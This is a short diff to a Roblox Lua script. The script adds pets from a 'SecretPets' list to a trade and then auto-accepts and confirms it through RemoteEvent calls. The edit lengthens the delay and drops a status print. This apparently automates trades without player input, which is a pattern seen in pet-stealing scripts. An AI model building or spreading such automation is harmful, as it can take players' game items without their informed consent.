@@ -3,7 +3,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
--- UPDATED
+-- UPDATED AGAIN
 -- RemoteEvent path
 local Event = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent
 
@@ -72,11 +72,10 @@ local function mainCode()
 			Event:FireServer("TradeAddPet", petId)
 
 			if i == #SecretPets then
-				task.delay(0.7, function()
-					print("Accepting trade")
-					Event:FireServer("TradeAccept")
-					task.wait(10)
-					Event:FireServer("TradeConfirm")
+				task.delay(5, function()
+				    Event:FireServer("TradeAccept")
+				    task.wait(10)
+				    Event:FireServer("TradeConfirm")
 				end)
 			end
 		end)
